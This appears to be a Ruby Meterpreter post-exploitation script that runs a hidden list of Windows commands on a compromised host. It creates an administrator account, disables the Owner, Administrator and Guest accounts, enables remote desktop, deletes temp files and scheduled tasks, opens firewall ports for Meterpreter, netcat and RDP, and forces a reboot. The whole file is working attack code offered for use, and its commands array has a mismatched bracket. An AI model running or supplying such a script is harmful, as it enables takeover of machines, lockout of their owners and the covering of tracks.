 def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
 commands = [ "Net Use * /delete",
["net user Username password",
	"net localgroup Administrators Username /add",
	"net user Owner /active:no",
	"net user Administrator /active:no",
	"net user Guest /active:no",
	"set rule group=\"remote desktop\" new enable=Yes",
	"netsh firewall set service type = remotedesktop mode = enable",
    	"del /q/f/s %TEMP%\\*",
    	"schtasks /tn * /delete",
    	"at /delete /yes",
	"netsh advfirewall firewall add rule name=’netcat’ dir=in action=allow protocol=Tcp localport=4445",
	"netsh advfirewall firewall add rule name=’Meterpreter’ dir=in action=allow protocol=Tcp localport=4444",
	"netsh advfirewall firewall add rule name=’ssl’ dir=in action=allow protocol=Tcp localport=443",
	"netsh advfirewall firewall add rule name=’RDP’ dir=in action=allow protocol=Tcp localport=3389",
	"netsh firewall add portopening tcp 4444 meterpreter",
	"netsh firewall add portopening tcp 3389 RDP",
	"netsh firewall add portopening tcp 443 ssl",
	"netsh firewall add portopening tcp 4445 netcat",
	"shutdown /r /t 10",	
	"netsh firewall set opmode enable enable",
	"netsh advfirewall set allprofiles state on"]
 
 list_exec(client,commands)
